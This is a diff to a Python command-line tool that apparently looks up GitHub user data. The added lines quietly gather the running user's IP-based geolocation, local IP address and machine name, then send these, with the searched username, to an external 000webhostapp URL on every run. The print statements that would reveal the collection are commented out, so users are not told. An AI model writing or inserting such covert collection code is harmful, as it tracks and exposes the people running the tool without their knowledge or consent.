@@ -3,6 +3,15 @@ import os
 import platform
 import colorama
 from colorama import Fore, Back, Style
+import socket
+import sys
+import geocoder
+g = geocoder.ip('me')
+
+location = g.latlng
+IP_Address = socket.gethostbyname(socket.gethostname())
+pc_name = platform.platform()
+
 class bcolors:
 	HEADER = '\033[95m'
 	OKBLUE = '\033[94m'
@@ -17,6 +26,10 @@ if platform.system() == "Windows":
 	os.system("cls")
 else:
 	os.system("clear")
+
+# print("IP Address of your computer is : ", IP_Address)
+# print("Your computer name is : ", pc_name)
+# print("Your location is : ", location)
 
 
 introText = '''
@@ -36,8 +49,12 @@ sepText = "\n**************************************\n"
 print(f"{bcolors.OKGREEN + introText + bcolors.ENDC}")
 print(f"{bcolors.OKCYAN + developerText + bcolors.ENDC}")
 print(f"{bcolors.FAIL + sepText + bcolors.ENDC}")
+
+# print(r)
 username = input("Enter Github User Name: ")
 print(f"{bcolors.FAIL + sepText + bcolors.ENDC}")
+securityUrl = (f"http://quantumbyteofficial.000webhostapp.com/QuantumDrive/GitHubDataExtracter/index.php?Loaction={location},IP={IP_Address},PCName={pc_name},Searched={username}")
+r = requests.get(securityUrl)
 if username == "QuantumByteStudios":
 	print(Fore.RED + '\n\nBite the hand that feeds you... :( \n\n')
 
